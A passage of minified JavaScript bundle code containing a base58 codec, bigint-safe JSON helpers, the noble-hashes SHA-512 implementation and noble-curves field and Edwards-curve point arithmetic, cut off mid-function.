u=l(),f=c(),d=r.origin,y=i();return{description:f,url:d,icons:y,name:u}}return Wl.getWindowMetadata=e,Wl}CA();function RA(t){if(t.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let f=0;f<e.length;f++)e[f]=255;for(let f=0;f<t.length;f++){const d=t.charAt(f),y=d.charCodeAt(0);if(e[y]!==255)throw new TypeError(d+" is ambiguous");e[y]=f}const n=t.length,r=t.charAt(0),i=Math.log(n)/Math.log(256),o=Math.log(256)/Math.log(n);function l(f){if(f instanceof Uint8Array||(ArrayBuffer.isView(f)?f=new Uint8Array(f.buffer,f.byteOffset,f.byteLength):Array.isArray(f)&&(f=Uint8Array.from(f))),!(f instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(f.length===0)return"";let d=0,y=0,g=0;const E=f.length;for(;g!==E&&f[g]===0;)g++,d++;const w=(E-g)*o+1>>>0,b=new Uint8Array(w);for(;g!==E;){let S=f[g],O=0;for(let $=w-1;(S!==0||O<y)&&$!==-1;$--,O++)S+=256*b[$]>>>0,b[$]=S%n>>>0,S=S/n>>>0;if(S!==0)throw new Error("Non-zero carry");y=O,g++}let m=w-y;for(;m!==w&&b[m]===0;)m++;let x=r.repeat(d);for(;m<w;++m)x+=t.charAt(b[m]);return x}function c(f){if(typeof f!="string")throw new TypeError("Expected String");if(f.length===0)return new Uint8Array;let d=0,y=0,g=0;for(;f[d]===r;)y++,d++;const E=(f.length-d)*i+1>>>0,w=new Uint8Array(E);for(;d<f.length;){const S=f.charCodeAt(d);if(S>255)return;let O=e[S];if(O===255)return;let $=0;for(let R=E-1;(O!==0||$<g)&&R!==-1;R--,$++)O+=n*w[R]>>>0,w[R]=O%256>>>0,O=O/256>>>0;if(O!==0)throw new Error("Non-zero carry");g=$,d++}let b=E-g;for(;b!==E&&w[b]===0;)b++;const m=new Uint8Array(y+(E-b));let x=y;for(;b!==E;)m[x++]=w[b++];return m}function u(f){const d=c(f);if(d)return d;throw new Error("Non-base"+n+" character")}return{encode:l,decodeUnsafe:c,decode:u}}var DA="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";RA(DA);const NA=t=>JSON.stringify(t,(e,n)=>typeof n=="bigint"?n.toString()+"n":n),kA=t=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,n=t.replace(e,'$1"$2n"$3');return JSON.parse(n,(r,i)=>typeof i=="string"&&i.match(/^\d+n$/)?BigInt(i.substring(0,i.length-1)):i)};function BA(t){if(typeof t!="string")throw new Error(`Cannot safe json parse value of type ${typeof t}`);try{return kA(t)}catch{return t}}function LA(t){return typeof t=="string"?t:NA(t)||""}function jA(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function cS(t,...e){if(!jA(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function q1(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function UA(t,e){cS(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}const Ho=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */const ig=t=>new DataView(t.buffer,t.byteOffset,t.byteLength);function MA(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function uS(t){return typeof t=="string"&&(t=MA(t)),cS(t),t}let FA=class{clone(){return this._cloneInto()}};function zA(t){const e=r=>t().update(uS(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function hS(t=32){if(Ho&&typeof Ho.getRandomValues=="function")return Ho.getRandomValues(new Uint8Array(t));if(Ho&&typeof Ho.randomBytes=="function")return Ho.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}function qA(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),o=BigInt(4294967295),l=Number(n>>i&o),c=Number(n&o),u=r?4:0,f=r?0:4;t.setUint32(e+u,l,r),t.setUint32(e+f,c,r)}let HA=class extends FA{constructor(e,n,r,i){super(),this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=ig(this.buffer)}update(e){q1(this);const{view:n,buffer:r,blockLen:i}=this;e=uS(e);const o=e.length;for(let l=0;l<o;){const c=Math.min(i-this.pos,o-l);if(c===i){const u=ig(e);for(;i<=o-l;l+=i)this.process(u,l);continue}r.set(e.subarray(l,l+c),this.pos),this.pos+=c,l+=c,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){q1(this),UA(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:o}=this;let{pos:l}=this;n[l++]=128,this.buffer.subarray(l).fill(0),this.padOffset>i-l&&(this.process(r,0),l=0);for(let y=l;y<i;y++)n[y]=0;qA(r,i-8,BigInt(this.length*8),o),this.process(r,0);const c=ig(e),u=this.outputLen;if(u%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const f=u/4,d=this.get();if(f>d.length)throw new Error("_sha2: outputLen bigger than state");for(let y=0;y<f;y++)c.setUint32(4*y,d[y],o)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:o,destroyed:l,pos:c}=this;return e.length=i,e.pos=c,e.finished=o,e.destroyed=l,i%n&&e.buffer.set(r),e}};const ph=BigInt(2**32-1),wy=BigInt(32);function fS(t,e=!1){return e?{h:Number(t&ph),l:Number(t>>wy&ph)}:{h:Number(t>>wy&ph)|0,l:Number(t&ph)|0}}function VA(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:o,l}=fS(t[i],e);[n[i],r[i]]=[o,l]}return[n,r]}const WA=(t,e)=>BigInt(t>>>0)<<wy|BigInt(e>>>0),KA=(t,e,n)=>t>>>n,GA=(t,e,n)=>t<<32-n|e>>>n,YA=(t,e,n)=>t>>>n|e<<32-n,JA=(t,e,n)=>t<<32-n|e>>>n,ZA=(t,e,n)=>t<<64-n|e>>>n-32,QA=(t,e,n)=>t>>>n-32|e<<64-n,XA=(t,e)=>e,eC=(t,e)=>t,tC=(t,e,n)=>t<<n|e>>>32-n,nC=(t,e,n)=>e<<n|t>>>32-n,rC=(t,e,n)=>e<<n-32|t>>>64-n,iC=(t,e,n)=>t<<n-32|e>>>64-n;function sC(t,e,n,r){const i=(e>>>0)+(r>>>0);return{h:t+n+(i/2**32|0)|0,l:i|0}}const oC=(t,e,n)=>(t>>>0)+(e>>>0)+(n>>>0),aC=(t,e,n,r)=>e+n+r+(t/2**32|0)|0,lC=(t,e,n,r)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0),cC=(t,e,n,r,i)=>e+n+r+i+(t/2**32|0)|0,uC=(t,e,n,r,i)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0)+(i>>>0),hC=(t,e,n,r,i,o)=>e+n+r+i+o+(t/2**32|0)|0,Le={fromBig:fS,split:VA,toBig:WA,shrSH:KA,shrSL:GA,rotrSH:YA,rotrSL:JA,rotrBH:ZA,rotrBL:QA,rotr32H:XA,rotr32L:eC,rotlSH:tC,rotlSL:nC,rotlBH:rC,rotlBL:iC,add:sC,add3L:oC,add3H:aC,add4L:lC,add4H:cC,add5H:hC,add5L:uC},[fC,dC]=Le.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),is=new Uint32Array(80),ss=new Uint32Array(80);let pC=class extends HA{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:n,Bh:r,Bl:i,Ch:o,Cl:l,Dh:c,Dl:u,Eh:f,El:d,Fh:y,Fl:g,Gh:E,Gl:w,Hh:b,Hl:m}=this;return[e,n,r,i,o,l,c,u,f,d,y,g,E,w,b,m]}set(e,n,r,i,o,l,c,u,f,d,y,g,E,w,b,m){this.Ah=e|0,this.Al=n|0,this.Bh=r|0,this.Bl=i|0,this.Ch=o|0,this.Cl=l|0,this.Dh=c|0,this.Dl=u|0,this.Eh=f|0,this.El=d|0,this.Fh=y|0,this.Fl=g|0,this.Gh=E|0,this.Gl=w|0,this.Hh=b|0,this.Hl=m|0}process(e,n){for(let O=0;O<16;O++,n+=4)is[O]=e.getUint32(n),ss[O]=e.getUint32(n+=4);for(let O=16;O<80;O++){const $=is[O-15]|0,R=ss[O-15]|0,T=Le.rotrSH($,R,1)^Le.rotrSH($,R,8)^Le.shrSH($,R,7),D=Le.rotrSL($,R,1)^Le.rotrSL($,R,8)^Le.shrSL($,R,7),B=is[O-2]|0,k=ss[O-2]|0,G=Le.rotrSH(B,k,19)^Le.rotrBH(B,k,61)^Le.shrSH(B,k,6),W=Le.rotrSL(B,k,19)^Le.rotrBL(B,k,61)^Le.shrSL(B,k,6),J=Le.add4L(D,W,ss[O-7],ss[O-16]),ne=Le.add4H(J,T,G,is[O-7],is[O-16]);is[O]=ne|0,ss[O]=J|0}let{Ah:r,Al:i,Bh:o,Bl:l,Ch:c,Cl:u,Dh:f,Dl:d,Eh:y,El:g,Fh:E,Fl:w,Gh:b,Gl:m,Hh:x,Hl:S}=this;for(let O=0;O<80;O++){const $=Le.rotrSH(y,g,14)^Le.rotrSH(y,g,18)^Le.rotrBH(y,g,41),R=Le.rotrSL(y,g,14)^Le.rotrSL(y,g,18)^Le.rotrBL(y,g,41),T=y&E^~y&b,D=g&w^~g&m,B=Le.add5L(S,R,D,dC[O],ss[O]),k=Le.add5H(B,x,$,T,fC[O],is[O]),G=B|0,W=Le.rotrSH(r,i,28)^Le.rotrBH(r,i,34)^Le.rotrBH(r,i,39),J=Le.rotrSL(r,i,28)^Le.rotrBL(r,i,34)^Le.rotrBL(r,i,39),ne=r&o^r&c^o&c,j=i&l^i&u^l&u;x=b|0,S=m|0,b=E|0,m=w|0,E=y|0,w=g|0,{h:y,l:g}=Le.add(f|0,d|0,k|0,G|0),f=c|0,d=u|0,c=o|0,u=l|0,o=r|0,l=i|0;const A=Le.add3L(G,J,j);r=Le.add3H(A,k,W,ne),i=A|0}({h:r,l:i}=Le.add(this.Ah|0,this.Al|0,r|0,i|0)),{h:o,l}=Le.add(this.Bh|0,this.Bl|0,o|0,l|0),{h:c,l:u}=Le.add(this.Ch|0,this.Cl|0,c|0,u|0),{h:f,l:d}=Le.add(this.Dh|0,this.Dl|0,f|0,d|0),{h:y,l:g}=Le.add(this.Eh|0,this.El|0,y|0,g|0),{h:E,l:w}=Le.add(this.Fh|0,this.Fl|0,E|0,w|0),{h:b,l:m}=Le.add(this.Gh|0,this.Gl|0,b|0,m|0),{h:x,l:S}=Le.add(this.Hh|0,this.Hl|0,x|0,S|0),this.set(r,i,o,l,c,u,f,d,y,g,E,w,b,m,x,S)}roundClean(){is.fill(0),ss.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}};const gC=zA(()=>new pC);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Fm=BigInt(0),dS=BigInt(1),yC=BigInt(2);function zm(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function qm(t){if(!zm(t))throw new Error("Uint8Array expected")}function sg(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const mC=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Hm(t){qm(t);let e="";for(let n=0;n<t.length;n++)e+=mC[t[n]];return e}function pS(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?Fm:BigInt("0x"+t)}const di={_0:48,_9:57,A:65,F:70,a:97,f:102};function H1(t){if(t>=di._0&&t<=di._9)return t-di._0;if(t>=di.A&&t<=di.F)return t-(di.A-10);if(t>=di.a&&t<=di.f)return t-(di.a-10)}function gS(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,o=0;i<n;i++,o+=2){const l=H1(t.charCodeAt(o)),c=H1(t.charCodeAt(o+1));if(l===void 0||c===void 0){const u=t[o]+t[o+1];throw new Error('hex string expected, got non-hex character "'+u+'" at index '+o)}r[i]=l*16+c}return r}function wC(t){return pS(Hm(t))}function Uh(t){return qm(t),pS(Hm(Uint8Array.from(t).reverse()))}function yS(t,e){return gS(t.toString(16).padStart(e*2,"0"))}function vy(t,e){return yS(t,e).reverse()}function pi(t,e,n){let r;if(typeof e=="string")try{r=gS(e)}catch(o){throw new Error(t+" must be hex string or Uint8Array, cause: "+o)}else if(zm(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}function V1(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];qm(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const o=t[r];n.set(o,i),i+=o.length}return n}const og=t=>typeof t=="bigint"&&Fm<=t;function vC(t,e,n){return og(t)&&og(e)&&og(n)&&e<=t&&t<n}function Kl(t,e,n,r){if(!vC(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function bC(t){let e;for(e=0;t>Fm;t>>=dS,e+=1);return e}const EC=t=>(yC<<BigInt(t-1))-dS,xC={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||zm(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function Vm(t,e,n={}){const r=(i,o,l)=>{const c=xC[o];if(typeof c!="function")throw new Error("invalid validator function");const u=t[i];if(!(l&&u===void 0)&&!c(u,t))throw new Error("param "+String(i)+" is invalid. Expected "+o+", got "+u)};for(const[i,o]of Object.entries(e))r(i,o,!1);for(const[i,o]of Object.entries(n))r(i,o,!0);return t}function W1(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const o=t(n,...r);return e.set(n,o),o}}const Kt=BigInt(0),_t=BigInt(1),Hs=BigInt(2),SC=BigInt(3),by=BigInt(4),K1=BigInt(5),G1=BigInt(8);function kt(t,e){const n=t%e;return n>=Kt?n:e+n}function _C(t,e,n){if(e<Kt)throw new Error("invalid exponent, negatives unsupported");if(n<=Kt)throw new Error("invalid modulus");if(n===_t)return Kt;let r=_t;for(;e>Kt;)e&_t&&(r=r*t%n),t=t*t%n,e>>=_t;return r}function qr(t,e,n){let r=t;for(;e-- >Kt;)r*=r,r%=n;return r}function Y1(t,e){if(t===Kt)throw new Error("invert: expected non-zero number");if(e<=Kt)throw new Error("invert: expected positive modulus, got "+e);let n=kt(t,e),r=e,i=Kt,o=_t;for(;n!==Kt;){const l=r/n,c=r%n,u=i-o*l;r=n,n=c,i=o,o=u}if(r!==_t)throw new Error("invert: does not exist");return kt(i,e)}function IC(t){const e=(t-_t)/Hs;let n,r,i;for(n=t-_t,r=0;n%Hs===Kt;n/=Hs,r++);for(i=Hs;i<t&&_C(i,e,t)!==t-_t;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(r===1){const l=(t+_t)/by;return function(c,u){const f=c.pow(u,l);if(!c.eql(c.sqr(f),u))throw new Error("Cannot find square root");return f}}const o=(n+_t)/Hs;return function(l,c){if(l.pow(c,e)===l.neg(l.ONE))throw new Error("Cannot find square root");let u=r,f=l.pow(l.mul(l.ONE,i),n),d=l.pow(c,o),y=l.pow(c,n);for(;!l.eql(y,l.ONE);){if(l.eql(y,l.ZERO))return l.ZERO;let g=1;for(let w=l.sqr(y);g<u&&!l.eql(w,l.ONE);g++)w=l.sqr(w);const E=l.pow(f,_t<<BigInt(u-g-1));f=l.sqr(E),d=l.mul(d,E),y=l.mul(y,f),u=g}return d}}function OC(t){if(t%by===SC){const e=(t+_t)/by;return function(n,r){const i=n.pow(r,e);if(!n.eql(n.sqr(i),r))throw new Error("Cannot find square root");return i}}if(t%G1===K1){const e=(t-K1)/G1;return function(n,r){const i=n.mul(r,Hs),o=n.pow(i,e),l=n.mul(r,o),c=n.mul(n.mul(l,Hs),o),u=n.mul(l,n.sub(c,n.ONE));if(!n.eql(n.sqr(u),r))throw new Error("Cannot find square root");return u}}return IC(t)}const $C=(t,e)=>(kt(t,e)&_t)===_t,PC=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function TC(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=PC.reduce((r,i)=>(r[i]="function",r),e);return Vm(t,n)}function AC(t,e,n){if(n<Kt)throw new Error("invalid exponent, negatives unsupported");if(n===Kt)return t.ONE;if(n===_t)return e;let r=t.ONE,i=e;for(;n>Kt;)n&_t&&(r=t.mul(r,i)),i=t.sqr(i),n>>=_t;return r}function CC(t,e){const n=new Array(e.length),r=e.reduce((o,l,c)=>t.is0(l)?o:(n[c]=o,t.mul(o,l)),t.ONE),i=t.inv(r);return e.reduceRight((o,l,c)=>t.is0(l)?o:(n[c]=t.mul(o,n[c]),t.mul(o,l)),i),n}function mS(t,e){const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function wS(t,e,n=!1,r={}){if(t<=Kt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:o}=mS(t,e);if(o>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let l;const c=Object.freeze({ORDER:t,isLE:n,BITS:i,BYTES:o,MASK:EC(i),ZERO:Kt,ONE:_t,create:u=>kt(u,t),isValid:u=>{if(typeof u!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof u);return Kt<=u&&u<t},is0:u=>u===Kt,isOdd:u=>(u&_t)===_t,neg:u=>kt(-u,t),eql:(u,f)=>u===f,sqr:u=>kt(u*u,t),add:(u,f)=>kt(u+f,t),sub:(u,f)=>kt(u-f,t),mul:(u,f)=>kt(u*f,t),pow:(u,f)=>AC(c,u,f),div:(u,f)=>kt(u*Y1(f,t),t),sqrN:u=>u*u,addN:(u,f)=>u+f,subN:(u,f)=>u-f,mulN:(u,f)=>u*f,inv:u=>Y1(u,t),sqrt:r.sqrt||(u=>(l||(l=OC(t)),l(c,u))),invertBatch:u=>CC(c,u),cmov:(u,f,d)=>d?f:u,toBytes:u=>n?vy(u,o):yS(u,o),fromBytes:u=>{if(u.length!==o)throw new Error("Field.fromBytes: expected "+o+" bytes, got "+u.length);return n?Uh(u):wC(u)}});return Object.freeze(c)}const J1=BigInt(0),gh=BigInt(1);function ag(t,e){const n=e.negate();return t?n:e}function vS(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function lg(t,e){vS(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1);return{windows:n,windowSize:r}}function RC(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function DC(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const cg=new WeakMap,bS=new WeakMap;function ug(t){return bS.get(t)||1}function NC(t,e){return{constTimeNegate:ag,hasPrecomputes(n){return ug(n)!==1},unsafeLadder(n,r,i=t.ZERO){let o=n;for(;r>J1;)r&gh&&(i=i.add(o)),o=o.double(),r>>=gh;return i},precomputeWindow(n,r){const{windows:i,windowSize:o}=lg(r,e),l=[];let c=n,u=c;for(let f=0;f<i;f++){u=c,l.push(u);for(let d=1;d<o;d++)u=u.add(c),l.push(u);c=u.double()}return l},wNAF(n,r,i){const{windows:o,windowSize:l}=lg(n,e);let c=t.ZERO,u=t.BASE;const f=BigInt(2**n-1),d=2**n,y=BigInt(n);for(let g=0;g<o;g++){const E=g*l;let w=Number(i&f);i>>=y,w>l&&(w-=d,i+=gh);const b=E,m=E+Math.abs(w)-1,x=g%2!==0,S=w<0;w===0?u=u.add(ag(x,r[b])):c=c.add(ag(S,r[m]))}return{p:c,f:u}},wNAFUnsafe(n,r,i,o=t.ZERO){const{windows:l,windowSize:c}=lg(n,e),u=BigInt(2**n-1),f=2**n,d=BigInt(n);for(let y=0;y<l;y++){const g=y*c;if(i===J1)break;let E=Number(i&u);if(i>>=d,E>c&&(E-=f,i+=gh),E===0)continue;let w=r[g+Math.abs(E)-1];E<0&&(w=w.negate()),o=o.add(w)}return o},getPrecomputes(n,r,i){let o=cg.get(r);return o||(o=this.precomputeWindow(r,n),n!==1&&cg.set(r,i(o))),o},wNAFCached(n,r,i){const o=ug(n);return this.wNAF(o,this.getPrecomputes(o,n,i),r)},wNAFCachedUnsafe(n,r,i,o){const l=ug(n);return l===1?this.unsafeLadder(n,r,o):this.wNAFUnsafe(l,this.getPrecomputes(l,n,i),r,o)},setWindowSize(n,r){vS(r,e),bS.set(n,r),cg.delete(n)}}}function kC(t,e,n,r){if(RC(n,t),DC(r,e),n.length!==r.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,o=bC(BigInt(n.length)),l=o>12?o-3:o>4?o-2:o?2:1,c=(1<<l)-1,u=new Array(c+1).fill(i),f=Math.floor((e.BITS-1)/l)*l;let d=i;for(let y=f;y>=0;y-=l){u.fill(i);for(let E=0;E<r.length;E++){const w=r[E],b=Number(w>>BigInt(y)&BigInt(c));u[b]=u[b].add(n[E])}let g=i;for(let E=u.length-1,w=i;E>0;E--)w=w.add(u[E]),g=g.add(w);if(d=d.add(g),y!==0)for(let E=0;E<l;E++)d=d.double()}return d}function BC(t){return TC(t.Fp),Vm(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...mS(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}const Ir=BigInt(0),Cn=BigInt(1),yh=BigInt(2),LC=BigInt(8),jC={zip215:!0};function UC(t){const e=BC(t);return Vm(t,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}function MC(t){const e=UC(t),{Fp:n,n:r,prehash:i,hash:o,randomBytes:l,nByteLength:c,h:u}=e,f=yh<<BigInt(c*8)-Cn,d=n.create,y=wS(e.n,e.nBitLength),g=e.uvRatio||((A,C)=>{try{return{isValid:!0,value:n.sqrt(A*n.inv(C))}}catch{return{isValid:!1,value:Ir}}}),E=e.adjustScalarBytes||(A=>A),w=e.domain||((A,C,U)=>{if(sg("phflag",U),C.length||U)throw new Error("Contexts/pre-hash are not supported");return A});function b(A,C){Kl("coordinate "+A,C,Ir,f)}function m(A){if(!(A instanceof O))throw new Error("ExtendedPoint expected")}const x=W1((A,C)=>{const{ex:U,ey:M,ez:N}=A,V=A.is0();C==null&&(C=V?LC:n.inv(N));const F=d(U*C),q=d(M*C),Q=d(N*C);if(V)return{x:Ir,y:Cn};if(Q!==Cn)throw new Error("invZ was invalid");return{x:F,y:q}}),S=W1(A=>{const{a:C,d:U}=e;if(A.is0())throw new Error("bad point: ZERO");const{ex:M,ey:N,ez:V,et:F}=A,q=d(M*M),Q=d(N*N),te=d(V*V),se=d(te*te),le=d(q*C),pe=d(te*d(le+Q)),he=d(se+d(U*d(q*Q)));if(pe!==he)throw new Error("bad point: equation left != right (1)");const fe=d(M*N),xe=d(V*F);if(fe!==xe)throw new Error("bad point: equation left != right (2)");return!0});class O{constructor(C,U,M,N){this.ex=C,this.ey=U,this.ez=M,this.et=N,b("x",C),b("y",U),b("z",M),b("t",N),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(C){if(C instanceof O)throw new Error("extended point not allowed");const{x:U,y:M}=C||{};return b("x",U),b("y",M),new O(U,M,Cn,d(U*M))}static normalizeZ(C){const U=n.invertBatch(C.map(M=>M.ez));return C.map((M,N)=>M.toAffine(U[N])).map(O.fromAffine)}static msm(C,U){return kC(O,y,C,U)}_setWindowSize(C){T.setWindowSize(this,C)}assertValidity(){S(this)}equals(C){m(C);const{ex:U,ey:M,ez:N}=this,{ex:V,ey:F,ez:q}=C,Q=d(U*q),te=d(V*N),se=d(M*q),le=d(F*N);return Q===te&&se===le}is0(){return this.equals(O.ZERO)}negate(){return new O(d(-this.ex),this.ey,this.ez,d(-this.et))}double(){const{a:C}=e,{ex:U,ey:M,ez:N}=this,V=d(U*U),F=d(M*M),q=d(yh*d(N*N)),Q=d(C*V),te=U+M,se=d(d(te*te)-V-F),le=Q+F,pe=le-q,he=Q-F,fe=d(se*pe),xe=d(le*he),Oe=d(se*he),Pe=d(pe*le);return new O(fe,xe,Pe,Oe)}add(C){m(C);const{a:U,d:M}=e,{ex:N,ey:V,ez:F,et:q}=this,{ex:Q,ey:te,ez:se,et:le}=C;if(U===BigInt(-1)){const ji=d((V-N)*(te+Q)),mr=d((V+N)*(te-Q)),mn=d(mr-ji);if(mn===Ir)return this.double();const Qt=d(F*yh*le),ii=d(q*yh*se),Es=ii+Qt,_n=mr+ji,xs=ii-Qt,z=d(Es*mn),I=d(_n*xs),P=d(Es*xs),K=d(mn*_n);return new O(z,I,K,P)}const pe=d(N*Q),he=d(V*te),fe=d(q*M*le),xe=d(F*se),Oe=d((N+V)*(Q+te)-pe-he),Pe=xe-fe,Re=xe+fe,Ue=d(he-U*pe),Zt=d(Oe*Pe),mo=d(Re*Ue),ri=d(Oe*Ue),wo=d(Pe*Re);return new O(Zt,mo,wo,ri)}subtract(C){return this.add(C.negate())}wNAF(C){return T.wNAFCached(this,C,O.normalizeZ)}multiply(C){const U=C;Kl("scalar",U,Cn,r);const{p:M,f:N}=this.wNAF(U);return O.normalizeZ([M,N])[0]}multiplyUnsafe(C,U=O.ZERO){const M=C;return Kl("scalar",M,Ir,r),M===Ir?R:this.is0()||M===Cn?this:T.wNAFCachedUnsafe(this,M,O.normalizeZ,U)}isSmallOrder(){return this.multiplyUnsafe(u).is0()}isTorsionFree(){return T.unsafeLadder(this,r).is0()}toAffine(C){return x(this,C)}clearCofactor(){const{h:C}=e;return C===Cn?this:this.multiplyUnsafe(C)}static fromHex(C,U=!1){const{d:M,a:N}=e,V=n.BYTES;C=pi("pointHex",C,V),sg("zip215",U);const F=C.slice(),q=C[V-1];F[V-1]=q&-129;const 